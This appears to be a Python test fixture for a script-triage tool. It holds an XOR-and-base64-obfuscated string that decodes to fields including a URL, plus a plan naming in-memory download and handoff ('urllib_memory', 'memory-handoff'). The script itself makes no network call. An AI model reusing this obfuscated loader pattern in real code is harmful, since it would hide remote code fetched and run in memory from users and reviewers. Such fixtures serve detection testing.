#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_88ff2a08 = ("VgJWXFBSXFVQBUsKCwwQHTQXFwEWEAoRLFkQCgEDBTsWARcRGB0USgcHUl1XBVZdSwANCAUSCg1KAQgUCQUcAUpWAlZcUFJcVVAFS"
    "0teFxQQEAxZCBYRGFYCVlxQUlxVUAVJCgMNBRQJBQdZAA07CgMNBRQJBQcYCgsMEB0UOwsQOwgIAQwXFgETCxRZCg0FDAc7FxMLAA"
    "oNExgBEg0MBxYFOwgBAQwTWRYBDRYWBQcYFAUJOxAFCRYLAlkKCw0QBQcXEQIGCxgKCw0XCgEMARYUCQsHOxAXDQhZHAUQCh0XGFV"
    "ZEAoRCwc7AQMFEBcYHRYLCQEJOwYNCAgWEVkWARAUBQAFGB0WCwkBCTsMBxAFFBcNAEgBEAsJARY7ARYNERUHBVkXFAEQFxhWWRI=")
CODEC_88ff2a08 = "base64_chunks|reverse_then_xor|64"

def load_88ff2a08():
    return base64.b64decode(MATERIAL_88ff2a08)

def decode_88ff2a08(item1):
    return bytes(value ^ 100 for value in reversed(item1))

def recover_88ff2a08():
    item4 = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
    _pass = 0
    while _pass < 1:
        item2 = decode_88ff2a08(load_88ff2a08())
        _pass += 1
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_88ff2a08():
    view = memoryview(recover_88ff2a08().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_88ff2a08():
    return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))

def obfuscation_88ff2a08():
    return "{left}{right}".format_map({"left": "format_", "right": "map"})

def plan_88ff2a08():
    fields = dict(item.split("=", 1) for item in inspect_88ff2a08().split("|"))
    analysis_surface = surface_88ff2a08()
    obfuscation_surface = obfuscation_88ff2a08()
    operation_plan = ("urllib_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_88ff2a08())
